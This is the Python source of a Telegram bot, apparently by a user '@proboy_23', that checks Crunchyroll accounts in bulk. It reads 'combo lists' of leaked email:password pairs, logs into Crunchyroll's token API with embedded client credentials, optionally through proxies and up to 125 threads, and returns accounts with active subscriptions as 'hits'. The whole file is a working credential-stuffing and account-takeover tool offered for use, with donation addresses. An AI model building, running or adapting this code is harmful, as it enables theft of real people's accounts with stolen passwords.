from fastapi import FastAPI, Request
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
import os
import time
import uuid
import requests
import concurrent.futures
from datetime import datetime
import asyncio
from functools import partial
from contextlib import asynccontextmanager
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CallbackQueryHandler

# ============= CONFIGURATION =============
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 7399488750))
CHANNEL_USERNAME = "@caysredirect"

TIMEOUT = 30
MAX_THREADS = 125
current_threads = MAX_THREADS

# ============= OWNER RESTRICTION =============
def is_owner(update: Update):
    return update.effective_user and update.effective_user.id == ADMIN_ID

# ============= BLOCKING RUNNER =============
async def run_blocking(func, *args, **kwargs):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, partial(func, *args, **kwargs))

# ============= FASTAPI LIFESPAN =============
@asynccontextmanager
async def lifespan(app: FastAPI):
    global tg_app
    await tg_app.initialize()
    await tg_app.start()
    
    webhook_url = os.getenv("WEBHOOK_URL")
    if webhook_url:
        await tg_app.bot.set_webhook(
            url=webhook_url,
            allowed_updates=["message", "edited_message", "channel_post", "callback_query"]
        )
        print(f"✅ Webhook set → {webhook_url}")
    else:
        print("⚠️ WEBHOOK_URL env var is missing!")

    print("🚀 Bot started on Vercel")
    yield

    await tg_app.stop()
    await tg_app.shutdown()

# ============= FASTAPI + TG APP =============
app = FastAPI(lifespan=lifespan)
tg_app = Application.builder().token(BOT_TOKEN).build()

# ============= TELEGRAM BOT HANDLERS =============

# ============= NEW: SETTINGS MENU FUNCTIONS =============
async def show_settings_menu(query, context):
    """Replicates the exact Settings Menu from your screenshot"""
    global current_threads
    
    settings_text = f"""
⚙️ <b>Settings Menu</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
Configure your bot preferences below:

🧵 <b>Threads</b>: Control scan speed
Current: <b>{current_threads} threads</b>

🔌 <b>API Mode</b>: Select scanning method
Current: <b>Crunchyroll</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
<i>Click a button to configure:</i>
    """.strip()
    
    keyboard = [
        [
            InlineKeyboardButton("🧵 Set Threads", callback_data="set_threads"),
            InlineKeyboardButton("🔌 API Mode", callback_data="set_api_mode"),
        ],
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        settings_text,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def handle_set_threads(query, context):
    """Replicates the exact Set Thread Count screen from your screenshot"""
    global current_threads
    # Owner is always VIP
    plan = "VIP"
    
    text = f"""
<b>Set Thread Count</b>

Limits by plan:
🆓 FREE: 1-10
⭐ BASIC: 1-75
👑 VIP: 1-125

Your plan <b>{plan}</b> allows 1-125 threads.

Current threads: <b>{current_threads}</b>

Send a number between 1 and 125 to set your thread count.
    """.strip()
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_settings")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, parse_mode='HTML', reply_markup=reply_markup)
    
    # Enable waiting state (reuses your existing threads_command logic)
    context.user_data['waiting_for_threads'] = True

async def handle_api_mode(query, context):
    """Placeholder for API Mode (you can expand later without touching checker)"""
    text = f"""
<b>API Mode</b>

Current scanning method: <b>Crunchyroll</b> ✅

Other modes (Netflix, etc.) coming soon...
    """.strip()
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_settings")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, parse_mode='HTML', reply_markup=reply_markup)

def format_single_result(result):
    """Returns nicely formatted HTML for single account check"""
    if result['success']:
        return f"""
✅ <b>HIT FOUND!</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>

────────────────
📊 <b>Account Details</b>
• Verified: <b>{result['email_verified']}</b>
• Created: <b>{result['account_creation'] or 'N/A'}</b>
• Plan: <b>{result['plan']}</b>
• Currency: {result['currency'] or 'N/A'}
• Subscribable: {result['subscribable']}
• Free Trial: {result['free_trial']}
• Expiry: <b>{result['expiry'] or 'N/A'}</b>
• Active: ✅ <b>{result['active']}</b>
• Country: <b>{result['country']}</b>

────────────────
Channel: {CHANNEL_USERNAME}
        """.strip()
    else:
        return f"""
❌ <b>CHECK FAILED</b>

📧 <b>Email:</b> <code>{result['email']}</code>

Status: {result['message']}

Try another account!
        """.strip()

def check_crunchyroll(email, password, proxy=None):
    """Improved version with retry for better consistency"""
    result = {
        'email': email,
        'password': password,
        'success': False,
        'message': '',
        'email_verified': 'No',
        'account_creation': '',
        'plan': 'None',
        'currency': '',
        'subscribable': 'False',
        'free_trial': 'False',
        'expiry': '',
        'active': 'False',
        'country': 'Unknown'
    }
    
    max_retries = 2
    
    for attempt in range(max_retries + 1):
        try:
            # Step 1: Get Access Token
            device_id = str(uuid.uuid4())
            token_url = "https://beta-api.crunchyroll.com/auth/v1/token"
            token_data = {
                "grant_type": "password",
                "username": email,
                "password": password,
                "scope": "offline_access",
                "client_id": "y2arvjb0h0rgvtizlovy",
                "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
                "device_type": "BotChecker",
                "device_id": device_id,
                "device_name": "CrunchyBot"
            }
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
            }
            
            proxies = {'http': proxy, 'https': proxy} if proxy else None
            resp = requests.post(token_url, data=token_data, headers=headers, proxies=proxies, timeout=25)
            
            if resp.status_code != 200:
                if attempt < max_retries:
                    time.sleep(1.5)
                    continue
                result['message'] = f"HTTP {resp.status_code}"
                return result
                
            token_data = resp.json()
            access_token = token_data.get('access_token')
            
            if not access_token:
                if 'invalid_credentials' in resp.text.lower():
                    result['message'] = "Invalid email or password"
                    return result
                elif attempt < max_retries:
                    time.sleep(1.5)
                    continue
                else:
                    result['message'] = "Failed to get access token"
                    return result
            
            # Step 2: Get Account Info
            acc_headers = {'Authorization': f'Bearer {access_token}', 'User-Agent': headers['User-Agent']}
            acc_resp = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=acc_headers, proxies=proxies, timeout=25)
            
            if acc_resp.status_code == 200:
                acc_data = acc_resp.json()
                result['email_verified'] = 'Yes' if acc_data.get('email_verified') else 'No'
                created = acc_data.get('created', '')
                if created:
                    result['account_creation'] = created.split('T')[0]
                external_id = acc_data.get('external_id')
                
                if external_id:
                    # Step 3: Subscription
                    subs_resp = requests.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}", 
                                           headers=acc_headers, proxies=proxies, timeout=25)
                    if subs_resp.status_code == 200:
                        subs_data = subs_resp.json()
                        result['active'] = 'Yes' if subs_data.get('is_active') else 'No'
                        result['expiry'] = subs_data.get('next_renewal_date', '').split('T')[0] if subs_data.get('next_renewal_date') else ''
                        result['country'] = subs_data.get('country_code', 'Unknown')
                    
                    # Step 4: Products
                    prod_resp = requests.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products", 
                                           headers=acc_headers, proxies=proxies, timeout=25)
                    if prod_resp.status_code == 200:
                        items = prod_resp.json().get('items', [])
                        if items:
                            product = items[0].get('product', {})
                            result['plan'] = product.get('sku', 'None')
                            result['currency'] = items[0].get('currency_code', '')
                            result['subscribable'] = 'Yes' if product.get('is_subscribable') else 'No'
                            result['free_trial'] = 'Yes' if items[0].get('active_free_trial') else 'No'
            
            # Final decision
            if result['active'] == 'Yes' and result['subscribable'] == 'Yes':
                result['success'] = True
                result['message'] = 'ACTIVE SUBSCRIPTION!'
            else:
                result['success'] = False
                result['message'] = 'No active subscription'
            
            return result   # Success on this attempt
            
        except Exception as e:
            if attempt < max_retries:
                time.sleep(2)
                continue
            result['message'] = f'Error: {str(e)[:80]}'
            return result
    
    return result

# ============= TELEGRAM BOT HANDLERS =============
async def threads_command(update: Update, context: CallbackContext):
    if not is_owner(update):
        return
    global current_threads
    
    if not context.args:
        await update.message.reply_text(
            f"🧵 Current Threads: <b>{current_threads}</b>\n\n"
            f"Usage: <code>/threads &lt;number&gt;</code>\n"
            f"Example: <code>/threads 30</code>\n\n"
            f"Recommended: 10-30 (Free users)\n"
            f"Max allowed: {MAX_THREADS}",
            parse_mode='HTML'
        )
        return
    
    try:
        new_threads = int(context.args[0])
        if 1 <= new_threads <= MAX_THREADS:
            current_threads = new_threads
            await update.message.reply_text(
                f"✅ Threads updated successfully!\n"
                f"🧵 New Thread Count: <b>{current_threads}</b>",
                parse_mode='HTML'
            )
        else:
            await update.message.reply_text(f"❌ Please use number between 1 and {MAX_THREADS}")
    except:
        await update.message.reply_text("❌ Invalid number! Send a number only.")

async def start(update: Update, context: CallbackContext):
    if not is_owner(update):
            await update.message.reply_text(
                "❌ This bot is private.",
                parse_mode='HTML'
            )
            return
    
    keyboard = [
        [
            InlineKeyboardButton("📊 My Stats", callback_data="menu_stats"),
            InlineKeyboardButton("🔗 My Referrals", callback_data="menu_referrals")
        ],
        [
            InlineKeyboardButton("🎁 Rewards & Gifts", callback_data="menu_rewards"),
            InlineKeyboardButton("💎 Membership", callback_data="menu_membership")
        ],
        [
            InlineKeyboardButton("📞 Support", callback_data="menu_support"),
            InlineKeyboardButton("⚙️ Settings   ", callback_data="menu_settings")
        ]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome = f"""
<b>𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗖𝗔𝗬'𝗦 • 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
📤 <b>Send your combo list (.txt file)</b>
<i>Format: mail:pass (one per line)</i>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊<b>Your Dashboard:</b>
🧵 Threads: <code><b>{current_threads}/{current_threads}</b></code>
👑 Plan: <code><b>VIP</b></code>
📅 Days Left: <b>-</b>
📈 Daily Limit: <code><b>♾️</b></code>
📡 Mode: <code><b>Crunchyroll Check</b></code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>👇 Select an option from the menu below:</b>
"""
    await update.message.reply_text(
        welcome,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def help_command(update: Update, context: CallbackContext):
    if not is_owner(update):
        return
    help_text = """
COMMANDS:

/start - Start the bot
/help - Show this help
/stats - Bot statistics
/about - About developer

Input Format:
email:password

Bulk Check:
Send a .txt file with one account per line:
user1@example.com:pass123
user2@example.com:pass456
"""
    await update.message.reply_text(help_text)

async def stats_command(update: Update, context: CallbackContext):
    if not is_owner(update):
        return
    stats_text = """
BOT STATISTICS

Status: Online
Bot Version: 2.0
Uptime: Running
Creator: @proboy_23

Use /check to test an account
"""
    await update.message.reply_text(stats_text)

async def about_command(update: Update, context: CallbackContext):
    if not is_owner(update):
        return
    about_text = """
ABOUT DEVELOPER

Created by: @proboy_23
Channel: @acgiveaway_2
Support: @allichetoolsgroup

Support the creator:
Binance ID: 801774085
USDT (TRC20): TBeHkEpdtDqzzyvtWgMgiR1bhS7LDpi19L

This bot is free to use!
"""
    await update.message.reply_text(about_text)

# ============= NEW: THREAD INPUT HANDLER (reuses your logic) =============
async def process_thread_count_input(update: Update, context: CallbackContext):
    """Handles number input after clicking 'Set Threads' (exact match to your screenshot)"""
    global current_threads
    text = update.message.text.strip()
    
    try:
        new_threads = int(text)
        if 1 <= new_threads <= MAX_THREADS:
            current_threads = new_threads
            await update.message.reply_text(
                f"✅ <b>Thread count updated to {current_threads} for your account.</b>",
                parse_mode='HTML'
            )
            # Clear state
            context.user_data['waiting_for_threads'] = False
        else:
            await update.message.reply_text(f"❌ Please send a number between 1 and {MAX_THREADS}.")
    except ValueError:
        await update.message.reply_text("❌ Invalid number! Send a number only.")

async def handle_message(update: Update, context: CallbackContext):
    if not is_owner(update):
        return
    
    text = update.message.text.strip()
    
    # === NEW: Check if user is in thread settings mode (from Settings menu) ===
    if context.user_data.get('waiting_for_threads'):
        await process_thread_count_input(update, context)
        return  # Important: skip normal combo check
    
    # Original message handling (unchanged)
    if ':' in text and '@' in text:
        parts = text.split(':', 1)
        email = parts[0].strip()
        password = parts[1].strip()
        
        status_msg = await update.message.reply_text(
            f"🔍 Checking <code>{email}</code>...\nPlease wait...", 
            parse_mode='HTML'
        )
        
        result = await run_blocking(check_crunchyroll, email, password)
        
        response = format_single_result(result)
        await status_msg.edit_text(response, parse_mode='HTML')
    else:
        await update.message.reply_text(
            "❌ Invalid format!\n\nSend like this: <code>email:password</code>\n\nType /help for more info.", 
            parse_mode='HTML'
        )

async def handle_document(update: Update, context: CallbackContext):
    if not is_owner(update):
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file only!", parse_mode='HTML')
        return
    
    file = await context.bot.get_file(document.file_id)
    file_content = await file.download_as_bytearray()
    lines = file_content.decode('utf-8', errors='ignore').splitlines()
    
    accounts = []
    for line in lines:
        line = line.strip()
        if line and ':' in line and not line.startswith('#'):
            email, pwd = line.split(':', 1)
            accounts.append((email.strip(), pwd.strip()))
    
    if not accounts:
        await update.message.reply_text("❌ No valid accounts found!", parse_mode='HTML')
        return
    
    total = len(accounts)
    hits = []
    start_time = time.time()
    
    progress_msg = await update.message.reply_text(
        f"🚀 Starting bulk check with <b>{current_threads}</b> threads...\n"
        f"0/{total} completed (0%)", 
        parse_mode='HTML'
    )
    
    def check_account(acc):
        email, pwd = acc
        return check_crunchyroll(email, pwd)
    
    completed = 0
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=current_threads) as executor:
        future_to_acc = {executor.submit(check_account, acc): acc for acc in accounts}
        
        for future in concurrent.futures.as_completed(future_to_acc):
            result = future.result()
            completed += 1
            
            if result['success']:
                hits.append(result)
            
            if completed % 5 == 0 or completed == total:
                try:
                    percent = int((completed / total) * 100)
                    await progress_msg.edit_text(
                        f"🚀 Checking with {current_threads} threads...\n"
                        f"{completed}/{total} completed ({percent}%)",
                        parse_mode='HTML'
                    )
                except:
                    pass
    
    # ====================== SUMMARY ======================
    elapsed = int(time.time() - start_time)
    cpm = int((total / elapsed) * 60) if elapsed > 0 else 0
    hits_count = len(hits)
    bad_count = total - hits_count
    
    summary = f"""
<b>📊 Scan Completed ✅</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 <b>File:</b> <code>{document.file_name}</code>
📊 <b>Processed:</b> <code>{completed}/{total}</code>
🧵 <b>Threads:</b> <code>{current_threads}</code>
📡 <b>Mode:</b> <code>Crunchyroll Check</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ <b>HITS:</b> <code>{hits_count}</code>
❌ <b>BAD:</b> <code>{bad_count}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏱ <b>Elapsed:</b> <code>{elapsed}s</code>
⚡ <b>CPM:</b> <code>{cpm}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    await progress_msg.edit_text(summary, parse_mode='HTML')
    
    # ====================== SEND HITS FILE ======================
    if hits:
        hits_text = "EMAIL:PASSWORD | PLAN | EXPIRY | COUNTRY\n" + "="*60 + "\n"
        for hit in hits:
            hits_text += f"{hit['email']}:{hit['password']} | {hit['plan']} | {hit['expiry']} | {hit['country']}\n"
        
        # Use /tmp/ folder (important for Vercel)
        hits_file = f"/tmp/crunchy_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(hits_file, "w", encoding="utf-8") as f:
            f.write(hits_text)
        
        await update.message.reply_document(
            document=open(hits_file, "rb"),
            filename=f"crunchy_hits_{datetime.now().strftime('%Y%m%d_%H%M')}.txt",
            caption=f"🎉 <b>{hits_count} HIT(S) FOUND!</b>\n\nChecked with {current_threads} threads.",
            parse_mode='HTML'
        )

async def button_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()  # Remove loading animation

    # FIXED: Use update instead of query.message
    if not is_owner(update):
        await query.edit_message_text("❌ Access Denied.")
        return

    data = query.data

    if data == "menu_stats":
        text = "<b>📊 My Stats</b>\n\nBot is running smoothly.\nTotal checks today: 0\nHits found: 0"
        await query.edit_message_text(text, parse_mode='HTML', reply_markup=query.message.reply_markup)
    
    elif data == "menu_referrals":
        text = "<b>🔗 My Referrals</b>\n\nYour referral link:\n<code>https://t.me/yourbot?start=ref123</code>\n\nReferrals: 0"
        await query.edit_message_text(text, parse_mode='HTML', reply_markup=query.message.reply_markup)
    
    elif data == "menu_rewards":
        text = "<b>🎁 Rewards & Gifts</b>\n\nNo rewards available yet.\nKeep using the bot to earn!"
        await query.edit_message_text(text, parse_mode='HTML', reply_markup=query.message.reply_markup)
    
    elif data == "menu_membership":
        text = "<b>💎 Membership</b>\n\nCurrent Plan: <b>VIP</b>\nExpiry: Lifetime"
        await query.edit_message_text(text, parse_mode='HTML', reply_markup=query.message.reply_markup)
    
    elif data == "menu_settings":
        await show_settings_menu(query, context)
    
    elif data == "set_threads":
        await handle_set_threads(query, context)
    
    elif data == "set_api_mode":
        await handle_api_mode(query, context)
    
    elif data == "back_to_main":
        # Fixed: delete old message and send fresh start menu
        try:
            await query.message.delete()
        except:
            pass
        await start(update, context)  # Now safe
    
    elif data == "menu_support":
        text = "<b>📞 Support</b>\n\nContact @proboy_23 for any issues."
        await query.edit_message_text(text, parse_mode='HTML', reply_markup=query.message.reply_markup)
    
    else:
        text = "Unknown option"
        await query.edit_message_text(text, parse_mode='HTML')
# Register handlers
tg_app.add_handler(CommandHandler("start", start))
tg_app.add_handler(CommandHandler("help", help_command))
tg_app.add_handler(CommandHandler("stats", stats_command))
tg_app.add_handler(CommandHandler("about", about_command))
tg_app.add_handler(CommandHandler("threads", threads_command))
tg_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
tg_app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
tg_app.add_handler(CallbackQueryHandler(button_callback))

# ============== WEBHOOK ENDPOINT ==============
@app.post("/webhook")
async def webhook(request: Request):
    try:
        data = await request.json()
        update = Update.de_json(data, tg_app.bot)
        
        # Process update safely
        await tg_app.process_update(update)
        return {"status": "ok"}
    
    except Exception as e:
        print(f"❌ Webhook error: {e}")
        # Still return 200 so Telegram stops retrying
        return {"status": "error"}
    
# Optional: Health check
@app.get("/webhook")
async def webhook_get():
    return {
        "status": "✅ Webhook is Active",
        "info": "Telegram uses POST requests only. This is normal."
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)